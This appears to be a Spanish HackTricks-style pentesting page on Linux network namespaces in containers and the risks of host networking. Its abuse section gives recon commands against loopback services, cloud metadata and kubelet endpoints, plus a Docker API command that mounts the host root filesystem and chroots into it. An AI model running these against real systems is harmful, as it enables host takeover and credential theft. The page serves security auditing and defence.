# Namespace de red

{{#include ../../../../../banners/hacktricks-training.md}}

## Descripción general

El namespace de red aísla recursos relacionados con la red, como interfaces, direcciones IP, tablas de enrutamiento, estado ARP/neighbor, reglas del firewall, sockets, el namespace abstracto de sockets de dominio UNIX y el contenido de archivos como `/proc/net`. Por eso un contenedor puede tener lo que parece su propio `eth0`, sus propias rutas locales y su propio dispositivo loopback sin poseer la pila de red real del host.

Desde el punto de vista de la seguridad, esto es importante porque el aislamiento de red implica mucho más que la vinculación de puertos. Un namespace de red privado limita lo que la carga de trabajo puede observar o reconfigurar directamente. Cuando ese namespace se comparte con el host, el contenedor puede obtener repentinamente visibilidad sobre los listeners del host, los servicios locales del host, los endpoints AF_UNIX abstractos y los puntos de control de red que nunca estuvieron destinados a exponerse a la aplicación.

## Funcionamiento

Un namespace de red recién creado comienza con un entorno de red vacío o casi vacío hasta que se le conectan interfaces. Después, los container runtimes crean o conectan interfaces virtuales, asignan direcciones y configuran rutas para que la carga de trabajo tenga la conectividad esperada. En implementaciones basadas en bridge, esto normalmente significa que el contenedor ve una interfaz respaldada por veth conectada a un bridge del host. En Kubernetes, los plugins CNI gestionan una configuración equivalente para el networking de los Pods.

Esta arquitectura explica por qué `--network=host` o `hostNetwork: true` supone un cambio tan drástico. En lugar de recibir una pila de red privada preparada, la carga de trabajo se une a la pila real del host.

## Laboratorio

Puedes ver un namespace de red casi vacío con:
```bash
sudo unshare --net --fork bash
ip addr
ip route
```
Y puedes comparar contenedores normales y contenedores con red del host con:
```bash
docker run --rm debian:stable-slim sh -c 'ip addr || ifconfig'
docker run --rm --network=host debian:stable-slim sh -c 'ss -lntp | head'
```
El container con network del host ya no tiene su propia vista aislada de sockets e interfaces. Ese cambio por sí solo ya es significativo, incluso antes de preguntar qué capabilities tiene el proceso.

## Uso en runtime

Docker y Podman normalmente crean un network namespace privado para cada container, a menos que se configuren de otra manera. Kubernetes suele proporcionar a cada Pod su propio network namespace, compartido por los containers dentro de ese Pod, pero separado del host. Esto significa que `127.0.0.1` normalmente es local al Pod, no al container: un listener vinculado únicamente a localhost en un container suele ser accesible desde sus sidecars y containers hermanos. Los sistemas Incus/LXC también proporcionan un aislamiento basado en network namespaces bastante completo, a menudo con una mayor variedad de configuraciones de networking virtual.

El principio común es que el networking privado es el límite de aislamiento predeterminado, mientras que el networking del host es una exclusión explícita de ese límite.

## Configuraciones incorrectas

La configuración incorrecta más importante consiste simplemente en compartir el network namespace del host. A veces esto se hace por rendimiento, monitorización de bajo nivel o conveniencia, pero elimina uno de los límites más claros disponibles para los containers. Los listeners locales del host pasan a ser accesibles de forma más directa, los servicios accesibles únicamente desde localhost pueden quedar expuestos, y capabilities como `CAP_NET_ADMIN` o `CAP_NET_RAW` se vuelven mucho más peligrosas porque las operaciones que habilitan se aplican ahora al propio entorno de networking del host.

Otro problema consiste en otorgar demasiadas network-related capabilities incluso cuando el network namespace es privado. Un namespace privado ayuda, pero no hace inofensivos los raw sockets ni el control avanzado de networking.

En Kubernetes, `hostNetwork: true` también cambia cuánto puedes confiar en la segmentación de networking a nivel de Pod. Kubernetes documenta que muchos network plugins no pueden distinguir correctamente el tráfico de los Pods con `hostNetwork` para la coincidencia de `podSelector` / `namespaceSelector` y, por lo tanto, lo tratan como tráfico ordinario del nodo. Desde el punto de vista de un atacante, esto significa que un workload comprometido con `hostNetwork` normalmente debería tratarse como un foothold de networking a nivel de nodo, no como un Pod normal que sigue limitado por las mismas suposiciones de policy que los workloads de una overlay network.

## Abuso

En configuraciones con aislamiento débil, los atacantes pueden inspeccionar los servicios que están escuchando en el host, acceder a management endpoints vinculados únicamente a loopback, sniffear o interferir con el tráfico dependiendo de las capabilities y el entorno concretos, o reconfigurar el routing y el estado del firewall si `CAP_NET_ADMIN` está presente. En un cluster, esto también puede facilitar el movimiento lateral y el reconocimiento del control plane.

Si sospechas que se está utilizando networking del host, empieza confirmando que las interfaces y los listeners visibles pertenecen al host y no a una network aislada del container:
```bash
ip addr
ip route
ss -lntup | head -n 50
```
Los servicios accesibles únicamente mediante loopback suelen ser el primer descubrimiento interesante:
```bash
ss -lntp | grep '127.0.0.1'
curl -s http://127.0.0.1:2375/version 2>/dev/null
curl -sk https://127.0.0.1:2376/version 2>/dev/null
```
Los sockets UNIX abstractos son otro objetivo fácil de pasar por alto porque están delimitados por el network namespace, aunque no parecen listeners TCP/UDP y puede que no existan como rutas del sistema de archivos bajo `/run`. Por lo tanto, un contenedor con la red del host puede heredar acceso a canales de control exclusivos del host que nunca se montaron mediante bind en el contenedor:
```bash
ss -xap 2>/dev/null | head -n 50
grep -a '@' /proc/net/unix 2>/dev/null | head -n 50
```
Un ejemplo histórico fue el bug de exposición de `containerd-shim` abstract-socket, pero la lección general es más importante que el CVE específico: una vez que un workload se une al network namespace del host, los servicios abstractos AF_UNIX también pasan a formar parte de la attack surface. Si esos sockets parecen estar relacionados con el runtime o ser administrativos, pasa a [Runtime API And Daemon Exposure](../../runtime-api-and-daemon-exposure.md).

Si hay network capabilities presentes, comprueba si el workload puede inspeccionar o modificar el stack visible:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link show
```
En kernels modernos, el networking del host junto con `CAP_NET_ADMIN` también puede exponer la ruta de paquetes más allá de simples cambios en `iptables` / `nftables`. Los qdiscs y filtros de `tc` también están limitados al namespace, por lo que, en un namespace de red del host compartido, se aplican a las interfaces del host que el contenedor puede ver. Si además está presente `CAP_BPF`, también cobran relevancia los programas eBPF relacionados con la red, como los loaders de TC y XDP:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw|cap_bpf'
for i in $(ls /sys/class/net 2>/dev/null); do
echo "== $i =="
tc qdisc show dev "$i" 2>/dev/null
tc filter show dev "$i" ingress 2>/dev/null
tc filter show dev "$i" egress 2>/dev/null
done
bpftool net 2>/dev/null
```
Esto es importante porque un atacante podría reflejar, redirigir, moldear o descartar el tráfico en el nivel de la interfaz del host, no solo reescribir las reglas del firewall. En un network namespace privado, esas acciones quedan contenidas en la vista del contenedor; en un network namespace compartido con el host, afectan al host.

En entornos de clúster o cloud, el networking del host también justifica un quick local recon de metadata y servicios adyacentes al control plane:
```bash
for u in \
http://169.254.169.254/latest/meta-data/ \
http://100.100.100.200/latest/meta-data/ \
http://127.0.0.1:10250/pods; do
curl -m 2 -s "$u" 2>/dev/null | head
done
```
En Kubernetes, recuerda que comprometer **cualquier** container de un Pod con varios containers también da acceso a los listeners de localhost abiertos por los containers hermanos y los sidecars, porque todo el Pod comparte un único network namespace. Esto adquiere especial relevancia con service-mesh, observability y los containers auxiliares cuyas interfaces de administración o debug están intencionadamente limitadas al interior del Pod en lugar de estar disponibles para todo el cluster:
```bash
ss -lntup | grep -E '127.0.0.1|::1'
curl -s http://127.0.0.1:15000/server_info 2>/dev/null | head
curl -s http://127.0.0.1:15000/config_dump 2>/dev/null | head
```
Trata "bound to localhost" como **privado del Pod**, no como **privado del container**. Después de comprometer un container del Pod, esa suposición deja de ser válida.

### Ejemplo completo: Host Networking + Acceso local al runtime / Kubelet

Host networking no proporciona automáticamente root del host, pero a menudo expone servicios que están diseñados para ser accesibles únicamente desde el propio nodo. Si uno de esos servicios está débilmente protegido, host networking se convierte en una ruta directa de escalada de privilegios.

Docker API en localhost:
```bash
curl -s http://127.0.0.1:2375/version 2>/dev/null
docker -H tcp://127.0.0.1:2375 run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Kubelet en localhost:
```bash
curl -k https://127.0.0.1:10250/pods 2>/dev/null | head
curl -k https://127.0.0.1:10250/runningpods/ 2>/dev/null | head
```
Impacto:

- compromiso directo del host si una API de runtime local está expuesta sin la protección adecuada
- reconocimiento del clúster o movimiento lateral si kubelet o los agentes locales son accesibles
- manipulación del tráfico o denegación de servicio cuando se combina con `CAP_NET_ADMIN`

## Comprobaciones

El objetivo de estas comprobaciones es averiguar si el proceso tiene una pila de red privada, qué rutas y listeners son visibles, y si la vista de red ya parece propia del host antes incluso de probar las capabilities.
```bash
readlink /proc/self/ns/net   # Current network namespace identifier
readlink /proc/1/ns/net      # Compare with PID 1 in the current container / pod
lsns -t net 2>/dev/null      # Reachable network namespaces from this view
ip netns identify $$ 2>/dev/null
ip addr                      # Visible interfaces and addresses
ip route                     # Routing table
ss -lntup                    # Listening TCP/UDP sockets with process info
ss -xap                      # UNIX sockets, including abstract namespace entries
grep -a '@' /proc/net/unix   # Quick view of abstract AF_UNIX sockets in this netns
```
Qué resulta interesante aquí:

- Si `/proc/self/ns/net` y `/proc/1/ns/net` ya parecen similares a los del host, el contenedor podría estar compartiendo el network namespace del host u otro namespace no privado.
- `lsns -t net` y `ip netns identify` son útiles cuando el shell ya está dentro de un namespace con nombre o persistente y quieres correlacionarlo con los objetos de `/run/netns` desde el lado del host.
- `ss -lntup` es especialmente valioso porque revela listeners que solo escuchan en loopback y endpoints de gestión locales. `ss -xap` y `/proc/net/unix` añaden la vista de los abstract sockets que las búsquedas habituales de sockets en el filesystem no detectan.
- Las rutas, los nombres de las interfaces, el contexto del firewall, el estado de `tc` y los attachments de eBPF adquieren mucha más importancia si están presentes `CAP_NET_ADMIN`, `CAP_NET_RAW` o `CAP_BPF`.
- En Kubernetes, un fallo en la resolución del nombre de un servicio desde un Pod con `hostNetwork` puede significar simplemente que el Pod no está usando `dnsPolicy: ClusterFirstWithHostNet`, no que el servicio no exista.
- En Pods con múltiples contenedores, los listeners de localhost pertenecen a todo el network namespace del Pod, así que comprueba los sidecars y los contenedores hermanos antes de asumir que un puerto que solo escucha en loopback es inaccesible desde el contenedor comprometido.

Al revisar un contenedor, evalúa siempre el network namespace junto con el conjunto de capabilities. El networking del host combinado con capabilities de red potentes representa una postura muy diferente a la del networking bridge combinado con un conjunto reducido de capabilities predeterminadas.

## Referencias

- [Advertencias sobre Kubernetes NetworkPolicy y `hostNetwork`](https://kubernetes.io/docs/concepts/services-networking/network-policies/)
- [`network_namespaces(7)` de Linux y el aislamiento de abstract UNIX sockets](https://man7.org/linux/man-pages/man7/network_namespaces.7.html)
- [Advisory de containerd: abstract Unix domain sockets expuestos a contenedores con networking del host](https://github.com/containerd/containerd/security/advisories/GHSA-36xw-fx78-c5r4)
- [Requisitos de tokens y capabilities de eBPF para programas eBPF relacionados con la red](https://docs.ebpf.io/linux/concepts/token/)
{{#include ../../../../../banners/hacktricks-training.md}}
